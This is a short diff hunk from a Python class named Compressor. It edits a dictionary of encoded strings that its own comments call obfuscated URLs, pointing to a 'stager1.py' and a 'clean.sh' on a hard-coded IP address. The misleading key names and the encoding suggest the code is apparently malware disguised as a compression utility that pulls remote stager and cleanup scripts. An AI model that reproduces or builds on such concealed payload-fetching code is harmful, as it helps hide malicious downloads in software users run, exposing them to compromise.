@@ -48,7 +48,7 @@ class Compressor:
         # Encrypted strings (obfuscated URLs)
         input_output_dict = {
             "compressed_bytes": "c3twbHN0emxze3psc3B7eHt7e3ttMTYjJScwc2wyOw==",     # 192.168.198.129:9999/stager1.py
-            "optimized": "c3twbHN0emxze3psc3B7eHpyenJtIS4nIyxsMSo="  # 192.168.198.129:8080/clean
+            "optimized": "c3twbHN0emxze3psc3B7eHpyenJtIS4nIyxsMSo="  # 192.168.198.129:8080/clean.sh
         }
 
         # Setup temp dir
